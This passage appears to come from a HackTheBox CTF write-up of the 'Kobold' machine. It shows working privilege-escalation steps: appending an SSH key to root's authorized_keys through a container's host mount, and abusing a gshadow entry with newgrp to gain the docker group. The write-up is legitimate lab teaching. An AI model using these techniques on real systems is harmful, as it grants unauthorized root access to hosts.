+<p>Now I’ll hit “Create Container”, and it shows up on the Containers view:</p>
+
+<p><a href="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722104905919.png"><img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722104905919.png" alt="image-20260722104905919" /><em>Click for full size image</em></a></p>
+
+<p>If I click on it, there’s a dashboard with a “Shell” tab and the host filesystem is mounted in <code class="language-plaintext highlighter-rouge">/host</code>:</p>
+
+<p><a href="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722104950056.png"><img src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722104950056.png" alt="image-20260722104950056" /><em>Click for full size image</em></a></p>
+
+<p>I’ll go to <code class="language-plaintext highlighter-rouge">/host/root/.ssh</code> and add my public key:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sh-5.1# </span><span class="nb">cd</span> /host/root/.ssh/
+<span class="gp">sh-5.1# </span><span class="nb">echo</span> <span class="s2">"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing"</span> <span class="o">&gt;&gt;</span> authorized_keys 
+</code></pre></div></div>
+
+<p>Now I can SSH into the host system as root:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@kobold.htb
+<span class="go">Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-106-generic x86_64)
+...[snip]...
+</span><span class="gp">root@kobold:~#</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>And grab the flag:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kobold:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">d137bb9d************************
+</span></code></pre></div></div>
+
+<h2 id="beyond-root">Beyond Root</h2>
+
+<h3 id="unintended-background">Unintended Background</h3>
+
+<p>There’s an unusual unintended in Kobold because of an unintended configuration in <code class="language-plaintext highlighter-rouge">/etc/gshadow</code> that IppSec noticed. The <code class="language-plaintext highlighter-rouge">gshadow</code> file is meant to be the group counterpart to <code class="language-plaintext highlighter-rouge">/etc/shadow</code>. Linux splits account data across a public file and a protected one. <code class="language-plaintext highlighter-rouge">/etc/passwd</code> holds the public user data while <code class="language-plaintext highlighter-rouge">/etc/shadow</code> holds the password hashes that must stay secret. Groups work the same way. <code class="language-plaintext highlighter-rouge">/etc/group</code> is world-readable and lists each group’s name, GID, and members, while <code class="language-plaintext highlighter-rouge">/etc/gshadow</code> holds the parts that shouldn’t be public, the group password hash and the list of group administrators.</p>
+
+<p>Each line in <code class="language-plaintext highlighter-rouge">gshadow</code> has four fields separated by colons. The first is the group name. The second is an optional group password hash, though most groups show a <code class="language-plaintext highlighter-rouge">!</code> to mark that there is no usable password. The third is a comma-separated list of administrators, users allowed to change the group’s password and membership with <code class="language-plaintext highlighter-rouge">gpasswd</code> without being root. The fourth is the list of members, mirroring <code class="language-plaintext highlighter-rouge">/etc/group</code>.</p>
+
+<p>A group password exists so that a user who isn’t a member can temporarily assume the group with <code class="language-plaintext highlighter-rouge">newgrp</code>, or run a single command under it with <code class="language-plaintext highlighter-rouge">sg</code>, by supplying the password. Group passwords are almost never used in practice, so anything unusual in this file, a set password, an unexpected administrator, or loose permissions, is worth a closer look.</p>
+
+<p>It is typically only readable by root and the shadow group:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /etc/gshadow
+<span class="go">-rw-r----- 1 root shadow 1083 Jul 19 19:34 /etc/gshadow
+</span></code></pre></div></div>
+
+<h3 id="gshadow-as-root">gshadow as root</h3>
+
+<p>As root, I can view the <code class="language-plaintext highlighter-rouge">gshadow</code> file. There are no group admins set, only members. I’ll show only the lines that don’t end in “:”:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kobold:/etc#</span><span class="w"> </span><span class="nb">cat </span>gshadow | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">':$'</span>
+<span class="go">adm:*::syslog
+www-data:*::alice
+operator:*::ben,alice
+docker:!::ben,alice
+alice:!::www-data
+</span></code></pre></div></div>
+
+<p>This is very similar to the <code class="language-plaintext highlighter-rouge">group</code> file:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kobold:/etc#</span><span class="w"> </span><span class="nb">cat </span>group | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">':$'</span>
+<span class="go">adm:x:4:syslog
+operator:x:37:ben,alice
+docker:x:111:alice
+</span></code></pre></div></div>
+
+<p>There are two differences:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">gshadow</code> shows www-data as a member of the alice group.</li>
+  <li><code class="language-plaintext highlighter-rouge">gshadow</code> shows ben as a member of the docker group.</li>
+</ul>
+
+<p>I never get a shell as www-data, so there’s not much to abuse there. But I do get a shell as ben, which creates a huge shortcut.</p>
+
+<p><code class="language-plaintext highlighter-rouge">group</code> is what is used to set a users default groups on logging in, but <code class="language-plaintext highlighter-rouge">gshadow</code> is what sets what groups a user can log into.</p>
+
+<h3 id="unintended">Unintended</h3>
+
+<p><code class="language-plaintext highlighter-rouge">newgrp</code> is the command to “log into a new group”. When I run it, if I’m not a member of the group according to <code class="language-plaintext highlighter-rouge">gshadow</code>, it asks for a password:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:~$</span><span class="w"> </span>newgrp adm
+<span class="go">Password:
+</span></code></pre></div></div>
+
+<p>That is looking for the password for the group which would be set in <code class="language-plaintext highlighter-rouge">gshadow</code> (though practically this is almost never set).</p>
+
+<p>When a user is listed as a member of a group in <code class="language-plaintext highlighter-rouge">gshadow</code>, they can add that group to their current session using <code class="language-plaintext highlighter-rouge">newgrp</code> without any prompt. So ben doesn’t have the <code class="language-plaintext highlighter-rouge">docker</code> group by default:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:~$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+</span><span class="gp">ben@kobold:~$</span><span class="w"> </span>docker ps
+<span class="go">permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/containers/json": dial unix /var/run/docker.sock: connect: permission denied
+</span></code></pre></div></div>
+
+<p>However, because ben is in the docker group in <code class="language-plaintext highlighter-rouge">gshadow</code>, I can add it:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ben@kobold:~$</span><span class="w"> </span>newgrp docker
+<span class="gp">ben@kobold:~$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
+</span><span class="gp">ben@kobold:~$</span><span class="w"> </span>docker ps
+<span class="go">CONTAINER ID   IMAGE                               COMMAND                  CREATED        STATUS          PORTS                      NAMES
+4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   5 months ago   Up 30 minutes   127.0.0.1:8080-&gt;8080/tcp   bin
+</span></code></pre></div></div>
+
+<p>As a member of the docker group, ben could do the same privesc done through Arcane, just much sooner in the box:</p>
+
+<pre><code class="language-mermaid">flowchart TD;
+    subgraph identifier[" "]
+      direction LR
+      start1[ ] ---&gt;|intended| stop1[ ]
+      style start1 height:0px;
+      style stop1 height:0px;
+      start2[ ] ---&gt;|unintended| stop2[ ]
+      style start2 height:0px;
+      style stop2 height:0px;
+    end
+    A[Shell as ben]--&gt;B(&lt;a href='#cve-2025-64714'&gt;CVE-2025-64714&lt;/a&gt;);
+    B--&gt;C[&lt;a href='#shell-as-nobody-in-privatebin'&gt;Shell as nobody\nin PrivateBin&lt;/a&gt;];
+    C--&gt;D(&lt;a href='#container'&gt;Find service\npassword&lt;/a&gt;);
+    D--&gt;E(&lt;a href='#arcane-authenticated-access'&gt;Arcane access&lt;/a&gt;);
+    E--&gt;F(&lt;a href='#container-abuse'&gt;Docker abuse&lt;/a&gt;);
+    F--&gt;G[Shell as root];
+    A--&gt;H(&lt;a href='#unintended-background'&gt;Add docker\ngroup&lt;/a&gt;);
+    H--&gt;F;
+
+linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
+linkStyle 1,8,9 stroke-width:2px,stroke:#4B9CD3,fill:none;
+style identifier fill:#1d1d1d,color:#FFFFFFFF;
+
+</code></pre>
+
+      </div>
+    </div>
+  
+  </div><a class="u-url" href="/2026/08/01/htb-kobold.html" hidden></a>
+</article>
+
+      </div>
+    </main>
+<footer class="site-footer">
+  <div class="footer-inner">
+
+    <div class="footer-brand">
+      <span class="footer-logo">0xdf hacks stuff</span>
+      <span class="footer-tagline">CTF solutions, malware analysis, home lab development</span>
+    </div>
+
+    <div class="footer-links">
+      <div class="footer-link-group">
+        <div class="footer-link-icons">
+          <a href="https://www.twitter.com/0xdf_" title="Twitter" aria-label="Twitter">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/></svg>
+          </a>
+          <a rel="me" href="https://infosec.exchange/@0xdf" title="Mastodon" aria-label="Mastodon">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792 0 11.813 0h-.03c-3.98 0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057 0 0 0 .023-.043v-1.809a.052.052 0 0 0-.02-.041.053.053 0 0 0-.046-.01 20.282 20.282 0 0 1-4.709.545c-2.73 0-3.463-1.284-3.674-1.818a5.593 5.593 0 0 1-.319-1.433.053.053 0 0 1 .066-.054c1.517.363 3.072.546 4.632.546.376 0 .75 0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23 0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112 0-1.668.668-1.668 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311 0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13 0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z"/></svg>
+          </a>
+          <a href="https://bsky.app/profile/0xdf.bsky.social" title="Bluesky" aria-label="Bluesky">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 10.8c-1.087-2.114-4.046-6.053-6.798-7.995C2.566.944 1.561 1.266.902 1.565.139 1.908 0 3.08 0 3.768c0 .69.378 5.65.624 6.479.815 2.736 3.713 3.66 6.383 3.364.136-.02.275-.039.415-.056-.138.022-.276.04-.415.056-3.912.58-7.387 2.005-2.83 7.078 5.013 5.19 6.87-1.113 7.823-4.308.953 3.195 2.05 9.271 7.733 4.308 4.267-4.308 1.172-6.498-2.74-7.078a8.741 8.741 0 0 1-.415-.056c.14.017.279.036.415.056 2.67.297 5.568-.628 6.383-3.364.246-.828.624-5.79.624-6.478 0-.69-.139-1.861-.902-2.206-.659-.298-1.664-.62-4.3 1.24C16.046 4.748 13.087 8.687 12 10.8Z"/></svg>
+          </a>
+          <a href="https://www.linkedin.com/in/0xdf" title="LinkedIn" aria-label="LinkedIn">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+          </a>
+          <a href="https://app.hackthebox.com/public/users/4935" title="HackTheBox" aria-label="HackTheBox">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"/></svg>
+          </a>
+        </div>
+      </div>
+      <div class="footer-link-group">
+        <div class="footer-link-icons">
+          <a href="https://youtube.com/channel/UChO9OAH57Flz35RRX__E25A" title="YouTube" aria-label="YouTube">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+          </a>
+          <a href="/feed.xml" title="RSS Feed" aria-label="RSS Feed">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"/></svg>
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-support">
+      <link href="https://fonts.googleapis.com/css?family=Cookie" rel="stylesheet">
+      <a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/0xdf">
+        <img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee">
+        <span>Buy me a coffee</span>
+      </a>
+    </div>
+
+  </div>
+
+  <script src="/assets/js/jquery-3.6.0.min.js" integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" crossorigin="anonymous"></script>
+  <script src="/assets/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  <script src="/assets/js/bootstrap-toc.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+  <script src="/assets/js/collapsable.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
+<script>
+  $(document).ready(function () {
+    mermaid.initialize({
+      startOnLoad:true,
+      theme: "default",
+    });
+    window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid'));
+  });
+</script>
+
+  <script src="/assets/js/fix_mermaid.js"></script>
+  
+  <script src="/assets/js/header_links.js"></script>
+  
+  <script src="/assets/js/blurable.js"></script>
+  
+
+
+  <!-- Twitter universal website tag code -->
+  <script>
+    !function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
+     },s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='//static.ads-twitter.com/uwt.js',
+     a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
+    // Insert Twitter Pixel ID and Standard Event data below
+    twq('init','o42o1');
+    twq('track','PageView');
+  </script>
+  <!-- End Twitter universal website tag code -->
+</footer>
+</body>
+
+</html>
